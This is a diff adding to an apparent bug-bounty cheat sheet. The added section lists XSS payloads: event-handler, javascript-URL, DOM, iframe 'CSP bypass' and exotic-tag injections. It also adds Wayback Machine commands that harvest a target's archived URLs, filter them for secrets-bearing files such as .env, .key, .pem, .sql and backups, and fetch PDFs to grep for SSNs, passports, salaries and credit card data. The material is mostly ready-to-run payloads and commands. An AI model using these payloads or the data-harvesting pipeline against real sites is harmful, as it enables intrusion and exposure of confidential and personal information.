@@ -32,3 +32,73 @@ nuclei -list filterparams.txt -c 70 -rl 200 -fhr -lfa -t ../../../../CoffinCNt/ 
 # Check for Xss/sqli in any input field
 
 '"><svg/onload=prompt(5);>{{7*7}}
+
+## Event handler injection
+
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+
+## Javascript URL Injection
+
+<a href="javascript:alert(1)">Click me</a>
+
+
+## DOM based xss
+
+#<img src=x onerror=alert(1)>
+
+
+## Content Security Policy (CSP) Bypass
+
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+
+## Weird Tags (Exotic html tags)
+
+<math href="javascript:alert(1)">Click</math>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<animate attributeName="href" values="javascript:alert(1)" />
+
+
+"><svg/onload=prompt`${document.domain}`>
+
+
+## Extra payload for bugbounty
+
+"><script>alert(1)</script>
+"><img src=x onerror=confirm(1)>
+"><svg/onload=prompt(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<img src="x" onerror="alert('XSS')">
+<svg><script>alert(1)</script>
+"><iframe/onload=alert(1)>
+
+
+
+
+
+
+# Wayback URL 
+
+https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original
+curl 'https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey' > output.txt
+cat out.txt | uro | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.git|\.env|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
+
+curl "https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc)$" | tee output.txt
+
+## Find sensitive Data in PDFs
+
+cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only|confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive|bank statement|invoice|salary|contract|agreement|non disclosure|passport|social security|ssn|date of birth|credit card|identity|id number|company confidential|staff only|management only|internal only)' && echo "$url"; done
+
+
+
+
+
+
+
+
